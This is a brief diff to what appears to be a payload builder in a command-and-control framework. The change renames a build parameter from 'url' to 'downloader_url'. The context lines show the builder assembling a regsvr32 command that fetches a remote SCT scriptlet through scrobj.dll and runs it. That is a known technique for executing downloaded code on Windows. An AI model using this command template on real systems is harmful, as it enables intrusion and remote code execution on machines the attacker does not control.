@@ -21,7 +21,7 @@ class cmd_regsvr32_remote_sct(PayloadType):
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
         BuildParameter(
-            name = "url",
+            name = "downloader_url",
             parameter_type=BuildParameterType.String,
             description="SCT payload URL",
         ),
@@ -37,7 +37,7 @@ class cmd_regsvr32_remote_sct(PayloadType):
         build_msg = ""
 
         try:
-            url = self.get_parameter('url')
+            url = self.get_parameter('downloader_url')
 
             payload = "regsvr32 /s /n /u /i:%s scrobj.dll" % url
 
